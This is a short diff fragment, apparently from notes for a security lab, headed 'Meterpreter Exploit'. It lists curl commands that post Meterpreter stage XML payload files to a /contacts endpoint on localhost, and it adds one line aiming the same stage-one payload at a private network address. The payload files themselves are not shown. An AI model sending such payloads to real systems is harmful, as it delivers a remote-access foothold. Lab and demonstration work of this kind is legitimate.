@@ -18,3 +18,4 @@ Meterpreter Exploit:
 curl --header "content-type: application/xml" --data @meterpreter-stage1.xml "http://localhost:8080/contacts"
 curl --header "content-type: application/xml" --data @meterpreter-stage2.xml "http://localhost:8080/contacts"
 
+curl --header "content-type: application/xml" --data @meterpreter-stage1.xml "http://192.168.239.146:8080/contacts"
